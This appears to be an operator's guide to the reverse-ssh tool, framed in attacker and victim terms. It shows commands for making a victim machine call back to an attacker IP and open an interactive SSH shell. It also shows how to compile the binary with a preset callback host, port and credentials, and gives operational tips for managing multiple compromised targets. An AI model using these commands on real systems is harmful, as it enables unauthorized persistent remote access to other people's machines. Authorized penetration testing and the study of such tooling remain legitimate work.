# Reverse-SSH Deployment & Hardening

## Why Reverse-SSH

`reverse-ssh` is useful when the victim cannot be reached inbound (NAT/firewall) but can open outbound connections. It provides interactive SSH shell, SFTP and forwarding.

## Minimal Reverse Workflow

```bash
# Attacker (listener side using reverse-ssh)
./reverse-ssh -l -p 31337

# Victim (dial home)
./reverse-ssh -p 31337 <attacker-ip>

# Attacker (shell to victim via reverse tunnel)
ssh -p 8888 127.0.0.1
```

## Important Port Model

- `-p` = SSH service port used during dial/listen phase
- `-b` = attacker-side bind port for incoming shell after reverse connection (default 8888)

If `-p` collides with local daemon or policy, change it and keep `-b` explicit.

## Hardening Defaults Before Use

The default password in public examples is insecure. Prefer compile-time customization:

```bash
RS_PASS="<strong-password>" RS_PUB="$(cat id_ed25519.pub)" make compressed
```

Recommended compile-time vars:
- `RS_PASS` custom password
- `RS_PUB` authorized key
- `LHOST/LPORT` to preseed callback target
- `BPORT` to avoid fixed 8888 assumptions

## Safe Listener Mode

If you only need remote forwarding and do not want shell/exec requests on listener:

```bash
./reverse-ssh -l -N -p 31337
```

`-N` denies incoming shell/exec/subsystem requests.

## Operational Tips

- Prefer key auth over password auth.
- Keep `-v` enabled only while troubleshooting; disable for normal operations.
- For multiple targets, assign unique `BPORT` ranges per host/user to avoid confusion.
- Use SSH config aliases on attacker side for repeatability.

## Windows Caveat

On older Windows versions (pre-ConPTY), interactive shell quality may degrade. Read upstream guidance for `ssh-shellhost.exe` path handling.

## Source Pointers

- Upstream README: usage, `-N`, build tricks (`RS_PASS`, `RS_PUB`, `LHOST`, `LPORT`, `BPORT`)
- Release history: latest public release v1.2.0
